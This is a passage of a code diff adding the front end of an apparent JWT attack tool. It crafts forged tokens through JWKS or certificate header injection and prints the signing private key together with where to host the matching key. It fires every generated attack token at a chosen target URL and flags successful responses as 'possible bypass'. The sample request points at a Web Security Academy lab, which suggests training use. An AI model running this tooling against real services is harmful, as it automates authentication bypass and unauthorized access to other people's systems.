+    save(r.token, mode+' injection');
+    const out=$('#craftout'); out.innerHTML='';
+    out.appendChild(artifact('Crafted header', JSON.stringify(r.header,null,2)));
+    if(r.artifact){
+      const label=(r.artifact.type==='jwks'?'Host this JWKS at ':'Host this certificate at ')+r.artifact.host_at;
+      const content=typeof r.artifact.content==='string'?r.artifact.content:JSON.stringify(r.artifact.content,null,2);
+      out.appendChild(artifact(label, content));
+    }
+    out.appendChild(artifact('Private key (signs this token — keep it matching your hosted key)', r.keypair.private_key));
+    $('#craftinfo').textContent='done — token is now active';
+    toast('crafted '+mode+' token');
+  }catch(e){$('#craftinfo').textContent='';toast(e.message);}
+}
+
+/* ---------- run all attacks against the target ---------- */
+async function runAllAgainstTarget(){
+  const url=$('#url').value.trim(); if(!url){toast('set a target URL first');return;}
+  if(!GEN.length){await runAttacks(); if(!GEN.length){toast('nothing to run');return;}}
+  const prog=$('#batchprog'); prog.classList.add('show'); prog.firstElementChild.style.width='0%';
+  const jobs=[];
+  if(ORIG_TOKEN)jobs.push({name:'baseline (original token)', token:ORIG_TOKEN, base:true});
+  GEN.forEach(g=>jobs.push(g));
+  const rows=[]; let baseline=null;
+  for(let i=0;i<jobs.length;i++){
+    const j=jobs[i]; const {headers,body}=requestFor(j.token);
+    let res;
+    try{res=await api('/api/send',{method:$('#method').value,url,headers,body,
+      insecure:$('#insecure').checked,follow_redirects:$('#redir').checked});}
+    catch(e){res={error:e.message};}
+    if(j.base&&!res.error)baseline={status:res.status,length:res.length};
+    rows.push({...j,res});
+    prog.firstElementChild.style.width=Math.round(100*(i+1)/jobs.length)+'%';
+    renderBatch(rows, baseline);
+  }
+  prog.classList.remove('show');
+  toast('ran '+jobs.length+' requests');
+}
+function renderBatch(rows, baseline){
+  const interesting=r=>{
+    if(r.error||!r.status)return '';
+    if(r.status>=200&&r.status<300)return 'hit';
+    if(baseline&&r.status!==baseline.status)return 'diff';
+    return '';
+  };
+  let html='<table class="btbl"><thead><tr><th>Attack</th><th>Status</th><th>Bytes</th><th>ms</th><th></th></tr></thead><tbody>';
+  rows.forEach((row,idx)=>{
+    const r=row.res; const cls=row.base?'base':interesting(r);
+    const flag=(cls==='hit')?'<span class="flag">◄ possible bypass</span>':
+               (cls==='diff')?'<span class="flag" style="color:var(--high)">◄ differs</span>':'';
+    let statusCell,bytes,ms,btn='';
+    if(r.error){statusCell='<span class="st err">ERR</span>';bytes='—';ms='—';}
+    else{statusCell=`<span class="st s${String(r.status)[0]}">${r.status}</span>`;
+      bytes=r.length;ms=r.elapsed_ms;
+      btn=`<button class="ghost mini" onclick="replayRow(${idx})">use</button>`;}
+    html+=`<tr class="${cls}"><td class="name">${esc(row.name)}${flag}</td>`+
+          `<td>${statusCell}</td><td>${bytes}</td><td>${ms}</td><td>${btn}</td></tr>`;
+  });
+  html+='</tbody></table>';
+  $('#batch').innerHTML=html;
+  window._batchRows=rows;
+}
+function replayRow(i){
+  const row=window._batchRows[i]; if(!row)return;
+  setActive(row.token); injectToken();
+  loadToken(row.token); toast('loaded: '+row.name);
+}
+async function sendReq(){
+  const url=$('#url').value.trim();if(!url){toast('set a URL');return;}
+  $('#resp').innerHTML='<span class="meta">sending…</span>';
+  try{
+    const r=await api('/api/send',{method:$('#method').value,url,
+      headers:headersToObj(),body:$('#reqbody').value,
+      insecure:$('#insecure').checked,follow_redirects:$('#redir').checked});
+    renderResp(r);
+  }catch(e){$('#resp').innerHTML=`<span class="meta" style="color:var(--crit)">${esc(e.message)}</span>`;}
+}
+function renderResp(r){
+  const cls='s'+String(r.status)[0];
+  const hdrs=Object.entries(r.headers).map(([k,v])=>`${k}: ${v}`).join('\n');
+  $('#resp').innerHTML=`
+    <div class="status">
+      <span class="pill ${cls}">${r.status} ${esc(r.reason||'')}</span>
+      <span class="meta">${r.elapsed_ms} ms</span>
+      <span class="meta">${r.length} bytes</span>
+      ${r.truncated?'<span class="meta">(body truncated)</span>':''}
+    </div>
+    <label class="fl" style="margin-top:10px">Response headers</label>
+    <pre class="out small">${esc(hdrs)}</pre>
+    <label class="fl">Response body</label>
+    <pre class="out">${esc(r.body||'')}</pre>`;
+}
+
+/* ---------- clipboard of payloads ---------- */
+function save(tok,label,orig){
+  if(SAVED.some(s=>s.tok===tok))return;
+  SAVED.unshift({tok,label,orig:!!orig});if(SAVED.length>40)SAVED.pop();renderSaved();}
+function renderSaved(){
+  const box=$('#clipboard');box.innerHTML='';
+  SAVED.forEach(s=>{
+    const d=document.createElement('div');d.className='attack';
+    d.innerHTML=`<div class="top"><span class="name" style="font-size:12px">${esc(s.label)}</span>
+      <span class="acts"></span></div><div class="tok">${esc(s.tok)}</div>`;
+    const a=d.querySelector('.acts');
+    a.appendChild(mkbtn('Copy',()=>copy(s.tok)));
+    a.appendChild(mkbtn('Use',()=>{loadToken(s.tok);}));
+    box.appendChild(d);
+  });
+}
+function copyActive(){if(ACTIVE)copy(ACTIVE);else toast('nothing to copy');}
+function useInRequest(){if(!ACTIVE){toast('build a token first');return;}injectToken();}
+function copy(t){navigator.clipboard.writeText(t).then(()=>toast('copied')).catch(()=>toast('copy failed'));}
+function esc(s){return String(s).replace(/[&<>]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;'}[c]));}
+
+/* ---------- sample ---------- */
+function loadSample(){
+  $('#importbox').value=
+`GET /admin HTTP/1.1
+Host: 0aXXlab.web-security-academy.net
+Cookie: session=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ3aWVuZXIifQ.5rvQZDgLmvXOA0cRcaZzY8IuQ9jZ9K3xY3xO1wJ2m3o
+User-Agent: forge
+
+`;
+  toast('sample loaded — hit Extract');
+}
+
+buildChips();onSignMode();onCraftMode();
+</script>
+</body>
+</html>
